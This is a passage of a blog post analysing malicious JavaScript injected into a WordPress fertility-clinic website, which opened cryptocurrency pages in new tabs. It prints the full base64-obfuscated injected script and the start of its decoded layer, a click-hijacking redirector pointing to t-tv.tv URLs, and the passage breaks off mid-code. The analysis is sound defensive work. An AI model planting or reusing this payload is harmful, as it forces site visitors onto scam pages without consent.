---
layout: post
title: "How I found a real-world crypto malicious Javascript injection"
date: 2023-03-15
tags:
  - Injection
  - Security 
---

One evening, while browsing through various fertility IVF clinic websites, my girlfriend, who is an embryologist looking for new opportunities, and I stumbled upon a very interesting website. At first glance, the website seemed like a typical clinic site with static information, pictures, and reviews. However, things took an unexpected turn when a cryptocurrency website suddenly popped up in a new tab.

Initially dismissing it as an ad, we closed the tab, but our curiosity was piqued when yet another cryptocurrency website appeared a few minutes later. As a software engineer, I couldn't resist taking a closer look at the website's source code.

Everything looked like a normal Wordpress website (that can be told easily after checking the asset urls or several ids with the prefix *wp-*) except a piece of code that was quite peculiar: six exact copies of hexadecimal code had been injected into the website.

## Obfuscation seen in the wild
This was the exact line we could find in the website source:  

This piece of javascript 
```javascript
<script type="text/javascript">document.write(atob("PHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPmRvY3VtZW50LndyaXRlKHVuZXNjYXBlKCIlM0MlNzMlNjMlNzIlNjklNzAlNzQlM0UlMjglNjYlNzUlNkUlNjMlNzQlNjklNkYlNkUlMjAlMjglNzAlNjElNzIlNjElNkQlNjUlNzQlNjUlNzIlNzMlMjklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzQlNjElNzIlNjclNjUlNzQlNzMlMjAlM0QlMjAlNUIlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNDclNkUlNDclMzAlNjMlMzYlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNzklNzklNjclMzElNjMlMzAlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNjklNjMlNDQlMzIlNjMlMzQlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNDMlNkElNjklMzMlNjMlMzUlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNjglNjklNjklMzQlNjMlMzElMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNkYlNDUlNTklMzUlNjMlMzAlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNDMlNzclNzclMzYlNjMlMzclMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNjclNEMlNkYlMzclNjMlMzIlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNkIlNzklNDclMzglNjMlMzQlMjclMkMlMjAlMjclNjglNzQlNzQlNzAlNzMlM0ElMkYlMkYlNzQlMkQlNzQlNzYlMkUlNzQlNzYlMkYlNkElNTQlNkQlMzklNjMlMzQlMjclNUQlMEQlMEElMjAlMjAlMjAlMjAlMkYlMkYlMjAlNTQlNjklNkQlNjUlNzMlMjAlNjIlNjUlNzQlNzclNjUlNjUlNkUlMjAlNjMlNkMlNjklNjMlNkIlNzMlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzIlNjUlNzMlNzQlNEQlNjklNkUlNzUlNzQlNjUlNzMlMjAlM0QlMjAlMzElM0IlMEQlMEElMjAlMjAlMjAlMjAlMkYlMkYlMjAlNEUlNzUlNkQlNjIlNjUlNzIlMjAlNkYlNjYlMjAlNjglNkYlNzUlNzIlNzMlMjAlNzQlNkYlMjAlNjElNkMlNkMlNkYlNzclMjAlNzIlNjUlMkQlNjMlNkMlNjklNjMlNkIlMjAlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjElNkMlNkMlNkYlNzclNjUlNjQlNDglNkYlNzUlNzIlNzMlMjAlM0QlMjAlMzIlM0IlMEQlMEElMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNjElNzYlNjUlNTQlNjElNzIlNjclNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNzMlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjAlM0QlMjAlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklMjAlM0QlM0UlMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzQlNjElNzIlNjclNjUlNzQlNzMlMkUlNjYlNkYlNzIlNDUlNjElNjMlNjglMjglMjglNzQlNjElNzIlNjclNjUlNzQlMkMlMjAlNjklNkUlNjQlNjUlNzglMjklMjAlM0QlM0UlMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjklNjYlMjglMjElNkMlNkYlNjMlNjElNkMlNTMlNzQlNkYlNzIlNjElNjclNjUlMkUlNjclNjUlNzQlNDklNzQlNjUlNkQlMjglNjAlMjQlN0IlNzQlNjElNzIlNjclNjUlNzQlN0QlMkQlNkMlNkYlNjMlNjElNkMlMkQlNzMlNzQlNkYlNzIlNjElNjclNjUlNjAlMjklMjklN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMDklNkMlNkYlNjMlNjElNkMlNTMlNzQlNkYlNzIlNjElNjclNjUlMkUlNzMlNjUlNzQlNDklNzQlNjUlNkQlMjglNjAlMjQlN0IlNzQlNjElNzIlNjclNjUlNzQlN0QlMkQlNkMlNkYlNjMlNjElNkMlMkQlNzMlNzQlNkYlNzIlNjElNjclNjUlNjAlMkMlMjAlMzAlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjclNjUlNzQlNTIlNjElNkUlNjQlNkYlNkQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDYlNzIlNkYlNkQlNTMlNzQlNkYlNzIlNjElNjclNjUlMjAlM0QlMjAlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklMjAlM0QlM0UlMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNkUlNkYlNkUlNTYlNjklNzMlNjklNzQlNjUlNjQlMjAlM0QlMjAlNzQlNjElNzIlNjclNjUlNzQlNzMlMkUlNjYlNjklNkMlNzQlNjUlNzIlMjglMjglNzQlNjElNzIlNjclNjUlNzQlMkMlMjAlNjklNkUlNjQlNjUlNzglMjklMjAlM0QlM0UlMjAlNkMlNkYlNjMlNjElNkMlNTMlNzQlNkYlNzIlNjElNjclNjUlMkUlNjclNjUlNzQlNDklNzQlNjUlNkQlMjglNjAlMjQlN0IlNzQlNjElNzIlNjclNjUlNzQlN0QlMkQlNkMlNkYlNjMlNjElNkMlMkQlNzMlNzQlNkYlNzIlNjElNjclNjUlNjAlMjklMjAlM0QlM0QlMjAlMzAlMjklMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzIlNjUlNzQlNzUlNzIlNkUlMjAlNkUlNkYlNkUlNTYlNjklNzMlNjklNzQlNjUlNjQlNUIlNEQlNjElNzQlNjglMkUlNjYlNkMlNkYlNkYlNzIlMjglNEQlNjElNzQlNjglMkUlNzIlNjElNkUlNjQlNkYlNkQlMjglMjklMjAlMkElMjAlNkUlNkYlNkUlNTYlNjklNzMlNjklNzQlNjUlNjQlMkUlNkMlNjUlNkUlNjclNzQlNjglMjklNUQlM0IlMEQlMEElMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDElNzMlNTYlNjklNzMlNjklNzQlNjUlNjQlMjAlM0QlMjAlMjglNzQlNjElNzIlNjclNjUlNzQlMjklMjAlM0QlM0UlMjAlNkMlNkYlNjMlNjElNkMlNTMlNzQlNkYlNzIlNjElNjclNjUlMkUlNzMlNjUlNzQlNDklNzQlNjUlNkQlMjglNjAlMjQlN0IlNzQlNjElNzIlNjclNjUlNzQlN0QlMkQlNkMlNkYlNjMlNjElNkMlMkQlNzMlNzQlNkYlNzIlNjElNjclNjUlNjAlMkMlMjAlMzElMjklM0IlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjclNjUlNzQlNTQlNjklNkQlNjUlNTMlNzQlNkYlNzIlNjElNjclNjUlMjAlM0QlMjAlMjglNkIlNjUlNzklMjklMjAlM0QlM0UlMjAlNkMlNkYlNjMlNjElNkMlNTMlNzQlNkYlNzIlNjElNjclNjUlMkUlNjclNjUlNzQlNDklNzQlNjUlNkQlMjglNjAlMjQlN0IlNkIlNjUlNzklN0QlMkQlNkMlNkYlNjMlNjElNkMlMkQlNzMlNzQlNkYlNzIlNjElNjclNjUlNjAlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNjUlNzQlNTQlNjklNkQlNjUlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjAlM0QlMjAlMjglNkIlNjUlNzklMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklMjAlM0QlM0UlMjAlNkMlNkYlNjMlNjElNkMlNTMlNzQlNkYlNzIlNjElNjclNjUlMkUlNzMlNjUlNzQlNDklNzQlNjUlNkQlMjglNjAlMjQlN0IlNkIlNjUlNzklN0QlMkQlNkMlNkYlNjMlNjElNkMlMkQlNzMlNzQlNkYlNzIlNjElNjclNjUlNjAlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjclNjUlNzQlNDglNkYlNzUlNzIlNzMlNDQlNjklNjYlNjYlMjAlM0QlMjAlMjglNzMlNzQlNjElNzIlNzQlNDQlNjElNzQlNjUlMkMlMjAlNjUlNkUlNjQlNDQlNjElNzQlNjUlMjklMjAlM0QlM0UlMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNkQlNzMlNDklNkUlNDglNkYlNzUlNzIlMjAlM0QlMjAlMzElMzAlMzAlMzAlMjAlMkElMjAlMzYlMzAlMjAlMkElMjAlMzYlMzAlM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzIlNjUlNzQlNzUlNzIlNkUlMjAlNEQlNjElNzQlNjglMkUlNzIlNkYlNzUlNkUlNjQlMjglNEQlNjElNzQlNjglMkUlNjElNjIlNzMlMjglNjUlNkUlNjQlNDQlNjElNzQlNjUlMjAlMkQlMjAlNzMlNzQlNjElNzIlNzQlNDQlNjElNzQlNjUlMjklMjAlMkYlMjAlNkQlNzMlNDklNkUlNDglNkYlNzUlNzIlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjclNjUlNzQlNEQlNjklNkUlNzQlNzMlNDQlNjklNjYlNjYlMjAlM0QlMjAlMjglNzMlNzQlNjElNzIlNzQlNDQlNjElNzQlNjUlMkMlMjAlNjUlNkUlNjQlNDQlNjElNzQlNjUlMjklMjAlM0QlM0UlMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNkQlNzMlNDklNkUlNEQlNjklNkUlNzQlNzMlMjAlM0QlMjAlMzElMzAlMzAlMzAlMjAlMkElMjAlMzYlMzAlM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzIlNjUlNzQlNzUlNzIlNkUlMjAlNEQlNjElNzQlNjglMkUlNzIlNkYlNzUlNkUlNjQlMjglNEQlNjElNzQlNjglMkUlNjElNjIlNzMlMjglNjUlNkUlNjQlNDQlNjElNzQlNjUlMjAlMkQlMjAlNzMlNzQlNjElNzIlNzQlNDQlNjElNzQlNjUlMjklMjAlMkYlMjAlNkQlNzMlNDklNkUlNEQlNjklNkUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlN0QlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzYlNjklNzMlNjklNzQlNEUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjAlM0QlMjAlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMkMlMjAlNjglNkYlNzMlNzQlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklMjAlM0QlM0UlMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjElNzYlNjUlNTQlNjElNzIlNjclNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNzMlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjAlM0QlMjAlNjclNjUlNzQlNTIlNjElNkUlNjQlNkYlNkQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDYlNzIlNkYlNkQlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjUlNzQlNTQlNjklNkQlNjUlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNjAlMjQlN0IlNjglNkYlNzMlNzQlN0QlMkQlNkQlNkUlNzQlNzMlNjAlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjUlNzQlNTQlNjklNkQlNjUlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNjAlMjQlN0IlNjglNkYlNzMlNzQlN0QlMkQlNjglNzUlNzIlNzMlNjAlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDElNzMlNTYlNjklNzMlNjklNzQlNjUlNjQlMjglNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzclNjklNkUlNjQlNkYlNzclMkUlNkYlNzAlNjUlNkUlMjglNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMkMlMjAlMjIlNUYlNjIlNkMlNjElNkUlNkIlMjIlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlN0QlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlMkYlMkYlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzIlNjElNkUlNjQlNkYlNkQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjAlM0QlMjAlNjclNjUlNzQlNTIlNjElNkUlNjQlNkYlNkQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDYlNzIlNkYlNkQlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlNzMlNjElNzYlNjUlNTQlNjElNzIlNjclNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNzMlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklM0IlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlNjYlNzUlNkUlNjMlNzQlNjklNkYlNkUlMjAlNjclNkMlNkYlNjIlNjElNkMlNDMlNkMlNjklNjMlNkIlMjglNjUlNzYlNjUlNkUlNzQlMjklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjUlNzYlNjUlNkUlNzQlMkUlNzMlNzQlNkYlNzAlNTAlNzIlNkYlNzAlNjElNjclNjElNzQlNjklNkYlNkUlMjglMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjglNkYlNzMlNzQlMjAlM0QlMjAlNkMlNkYlNjMlNjElNzQlNjklNkYlNkUlMkUlNjglNkYlNzMlNzQlM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNkMlNjUlNzQlMjAlNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjAlM0QlMjAlNjclNjUlNzQlNTIlNjElNkUlNjQlNkYlNkQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDYlNzIlNkYlNkQlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjAlM0QlMjAlNDQlNjElNzQlNjUlMkUlNzAlNjElNzIlNzMlNjUlMjglNkUlNjUlNzclMjAlNDQlNjElNzQlNjUlMjglMjklMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNjElNzYlNjUlNjQlNDQlNjElNzQlNjUlNDYlNkYlNzIlNEQlNjklNkUlNzQlNzMlMjAlM0QlMjAlNjclNjUlNzQlNTQlNjklNkQlNjUlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNjAlMjQlN0IlNjglNkYlNzMlNzQlN0QlMkQlNkQlNkUlNzQlNzMlNjAlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNjElNzYlNjUlNjQlNDQlNjElNzQlNjUlNDYlNkYlNzIlNDglNkYlNzUlNzIlNzMlMjAlM0QlMjAlNjclNjUlNzQlNTQlNjklNkQlNjUlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNjAlMjQlN0IlNjglNkYlNzMlNzQlN0QlMkQlNjglNzUlNzIlNzMlNjAlMjklM0IlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjklNjYlMjAlMjglNzMlNjElNzYlNjUlNjQlNDQlNjElNzQlNjUlNDYlNkYlNzIlNEQlNjklNkUlNzQlNzMlMjAlMjYlMjYlMjAlNzMlNjElNzYlNjUlNjQlNDQlNjElNzQlNjUlNDYlNkYlNzIlNDglNkYlNzUlNzIlNzMlMjklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzQlNzIlNzklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNzQlNkYlNzIlNjElNjclNjUlNDQlNjElNzQlNjUlNDYlNkYlNzIlNEQlNjklNkUlNzQlNzMlMjAlM0QlMjAlNzAlNjElNzIlNzMlNjUlNDklNkUlNzQlMjglNzMlNjElNzYlNjUlNjQlNDQlNjElNzQlNjUlNDYlNkYlNzIlNEQlNjklNkUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNzMlNzQlNkYlNzIlNjElNjclNjUlNDQlNjElNzQlNjUlNDYlNkYlNzIlNDglNkYlNzUlNzIlNzMlMjAlM0QlMjAlNzAlNjElNzIlNzMlNjUlNDklNkUlNzQlMjglNzMlNjElNzYlNjUlNjQlNDQlNjElNzQlNjUlNDYlNkYlNzIlNDglNkYlNzUlNzIlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNkQlNjklNkUlNzQlNzMlNDQlNjklNjYlNjYlMjAlM0QlMjAlNjclNjUlNzQlNEQlNjklNkUlNzQlNzMlNDQlNjklNjYlNjYlMjglNkUlNkYlNzclNDQlNjElNzQlNjUlMkMlMjAlNzMlNzQlNkYlNzIlNjElNjclNjUlNDQlNjElNzQlNjUlNDYlNkYlNzIlNEQlNjklNkUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjMlNkYlNkUlNzMlNzQlMjAlNjglNkYlNzUlNzIlNzMlNDQlNjklNjYlNjYlMjAlM0QlMjAlNjclNjUlNzQlNDglNkYlNzUlNzIlNzMlNDQlNjklNjYlNjYlMjglNkUlNkYlNzclNDQlNjElNzQlNjUlMkMlMjAlNzMlNzQlNkYlNzIlNjElNjclNjUlNDQlNjElNzQlNjUlNDYlNkYlNzIlNDglNkYlNzUlNzIlNzMlMjklM0IlMEQlMEElMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjklNjYlMjAlMjglNjglNkYlNzUlNzIlNzMlNDQlNjklNjYlNjYlMjAlM0UlM0QlMjAlNjElNkMlNkMlNkYlNzclNjUlNjQlNDglNkYlNzUlNzIlNzMlMjklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjElNzYlNjUlNTQlNjElNzIlNjclNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNzMlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjUlNzQlNTQlNjklNkQlNjUlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNjAlMjQlN0IlNjglNkYlNzMlNzQlN0QlMkQlNjglNzUlNzIlNzMlNjAlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjklNjYlMjAlMjglNkQlNjklNkUlNzQlNzMlNDQlNjklNjYlNjYlMjAlM0UlM0QlMjAlNzIlNjUlNzMlNzQlNEQlNjklNkUlNzUlNzQlNjUlNzMlMjklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNjklNjYlMjAlMjglNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjklMjAlN0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjUlNzQlNTQlNjklNkQlNjUlNTQlNkYlNTMlNzQlNkYlNzIlNjElNjclNjUlMjglNjAlMjQlN0IlNjglNkYlNzMlNzQlN0QlMkQlNkQlNkUlNzQlNzMlNjAlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzclNjklNkUlNjQlNkYlNzclMkUlNkYlNzAlNjUlNkUlMjglNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMkMlMjAlMjIlNUYlNjIlNkMlNjElNkUlNkIlMjIlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlNzMlNjUlNzQlNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlNDElNzMlNTYlNjklNzMlNjklNzQlNjUlNjQlMjglNkUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjklM0IlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMjAlNjMlNjElNzQlNjMlNjglMjAlMjglNjUlNzIlNzIlNkYlNzIlMjklMjAlN0IlMjAlNzYlNjklNzMlNjklNzQlNEUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMkMlMjAlNjglNkYlNzMlNzQlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlMjAlMjAlMjAlMjAlN0QlMjAlNjUlNkMlNzMlNjUlMjAlN0IlMjAlNzYlNjklNzMlNjklNzQlNEUlNjUlNzclNEMlNkYlNjMlNjElNzQlNjklNkYlNkUlMjglNzQlNjElNzIlNjclNjUlNzQlNzMlMkMlMjAlNjglNkYlNzMlNzQlMkMlMjAlNkUlNkYlNzclNDQlNjElNzQlNjUlMjklM0IlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlN0QlMEQlMEElMjAlMjAlMjAlMjAlNjQlNkYlNjMlNzUlNkQlNjUlNkUlNzQlMkUlNjElNjQlNjQlNDUlNzYlNjUlNkUlNzQlNEMlNjklNzMlNzQlNjUlNkUlNjUlNzIlMjglMjIlNjMlNkMlNjklNjMlNkIlMjIlMkMlMjAlNjclNkMlNkYlNjIlNjElNkMlNDMlNkMlNjklNjMlNkIlMjklMEQlMEElN0QlMjklMjglMjklM0MlMkYlNzMlNjMlNzIlNjklNzAlNzQlM0UiKSk8L3NjcmlwdD4="))</script>
```


That line was adding to the DOM some javascript that was encoded using Base64, as it contains a call to the atob() function which decodes a Base64-encoded string. Why would anybody try to obfuscate some javascript in a normal fertility clinic website?

If we decode the payload we get another encoded text which runs [the unescape method](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/unescape):

```javascript
<script type="text/javascript">document.write(unescape("%3C%73%63%72%69%70%74%3E%28%66%75%6E%63%74%69%6F%6E%20%28%70%61%72%61%6D%65%74%65%72%73%29%20%7B%0D%0A%20%20%20%20%63%6F%6E%73%74%20%74%61%72%67%65%74%73%20%3D%20%5B%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%47%6E%47%30%63%36%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%79%79%67%31%63%30%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%69%63%44%32%63%34%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%43%6A%69%33%63%35%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%68%69%69%34%63%31%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%6F%45%59%35%63%30%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%43%77%77%36%63%37%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%67%4C%6F%37%63%32%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%6B%79%47%38%63%34%27%2C%20%27%68%74%74%70%73%3A%2F%2F%74%2D%74%76%2E%74%76%2F%6A%54%6D%39%63%34%27%5D%0D%0A%20%20%20%20%2F%2F%20%54%69%6D%65%73%20%62%65%74%77%65%65%6E%20%63%6C%69%63%6B%73%0D%0A%